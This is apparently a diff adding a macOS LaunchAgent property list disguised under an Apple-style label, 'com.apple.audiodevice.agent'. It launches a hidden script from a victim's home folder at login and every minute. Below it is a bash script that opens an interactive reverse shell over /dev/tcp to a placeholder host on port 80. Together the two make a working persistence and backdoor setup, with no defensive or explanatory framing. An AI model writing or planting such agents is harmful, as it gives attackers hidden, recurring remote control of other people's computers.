@@ -1,0 +1,23 @@
+<plist version="1.0">
+    <dict>
+    <key>Label</key>
+        <string>com.apple.audiodevice.agent</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/sh</string>
+        <string>Users/ ..victim.. /.hidden/connect.sh</string>
+    </array>
+    <key>RunAtLoad</key>
+        <true/>
+    <key>StartInterval</key>
+        <integer>60</integer>
+    <key>AbandonProcessGroup</key>
+        <true/>
+    </dict>
+</plist>
+
+----------------------------------------------------------
+#!/bin/bash
+bash -i >& /dev/tcp/my.site.here.com/80 0>&1
+wait
+----------------------------------------------------------
